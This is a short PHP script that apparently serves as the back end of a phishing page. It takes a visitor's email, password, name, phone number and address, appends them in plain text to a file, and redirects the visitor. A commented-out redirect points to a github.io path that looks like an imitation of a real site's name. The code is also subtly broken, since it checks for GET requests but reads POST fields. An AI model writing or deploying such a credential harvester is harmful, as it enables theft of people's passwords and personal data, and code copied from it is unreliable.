<?php
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    $email = htmlspecialchars(string: $_POST['email']);
    $display_name = htmlspecialchars(string: $_POST['display_name']);
    $password = htmlspecialchars(string: $_POST['password']);
    $first_name = htmlspecialchars(string: $_POST['fname']);
    $last_name = htmlspecialchars(string: $_POST['lname']);
    $phone = htmlspecialchars(string: $_POST['Phone']);
    $address = htmlspecialchars(string: $_POST['address']);
    $zip = htmlspecialchars(string: $_POST['zip']);
    $country = htmlspecialchars(string: $_POST['country']);
    $state = htmlspecialchars(string: $_POST['state']);
    
    $data = "Email: $email, Display_Name: $display_name, Password: $password, First_Name: $first_name, Last_Name: $last_name, Phone: $phone, Address: $address, Zip: $zip, Country: $country, State: $state\n";

    $file = fopen(filename: "submissions.txt", mode: "a+");
    fwrite(stream: $file, data: $data);
    fclose(stream: $file);
    // header(header: "Location: https://locatedmaple38.github.io/theislidefamly.com/"); 
    header(header: "Location: https://localhost:8000/");
}
?>